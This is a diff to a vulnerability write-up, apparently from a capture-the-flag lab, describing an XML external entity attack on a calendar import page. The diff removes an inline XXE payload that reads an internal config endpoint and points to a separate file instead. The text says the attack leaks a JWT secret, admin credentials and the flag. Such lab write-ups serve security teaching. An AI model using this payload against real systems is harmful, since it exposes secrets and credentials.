@@ -20,22 +20,9 @@
 
 - **Steps to Reproduce:**
   1. Login and Navigate to the calendar XML import functionality("http://localhost:4942/agenda")
-  2. Create a file named `agenda_xxe.xml` with the following content:
+  2. Upload `agenda_xxe.xml` in the import 
 
-     ```xml
-     <?xml version="1.0" encoding="UTF-8"?>
-     <!DOCTYPE agenda [
-       <!ENTITY config SYSTEM "http://127.0.0.1:4942/internal/config">
-     ]>
-     <agenda>
-       <event>
-         <title>&config;</title>
-         <date>2026-10-30</date>
-       </event>
-     </agenda>
-     ```
-
-  3. Upload the XML file using the calendar import form.
+  3. Upload `./xml_external_entity_injection/agenda_xxe.xml` using the calendar import form.
   4. Observe that the XML parser resolves the external entity and retrieves the internal configuration.
   5. The imported event displays the configuration data, including `jwt_secret`, PocketBase administrator credentials, and the flag.
 
